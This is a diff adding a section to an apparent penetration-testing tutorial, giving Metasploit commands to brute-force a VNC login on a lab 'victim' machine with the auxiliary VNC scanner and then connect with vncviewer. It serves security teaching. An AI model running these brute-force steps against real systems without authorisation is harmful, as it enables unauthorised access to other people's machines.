@@ -165,3 +165,19 @@ This is the most anticipated step of the penetration test. In this step, we'll e
 - sessions -l
 - sessions -u 1
 - sessions -k 1
+
+---
+
+## Exploiting VNC (Virtual Network Computing)
+
+Now lets try to exploit the vnc service running on out victim machine. If you search in metasploit database, you will find no matching exploit for this one. This means you have to think of some other ways to get into this ervice. Lets try to brute force the vnc login. We'll be using the auxiliary scanner for vnc login:
+
+- search scanner vnc
+- use 3
+- info
+- set RHOSTS Target_IP
+- set STOP_ON_SUCCESS true
+- set THREADS 32
+- set USER_AS_PASS true
+- run
+- vncviewer <target_ip>
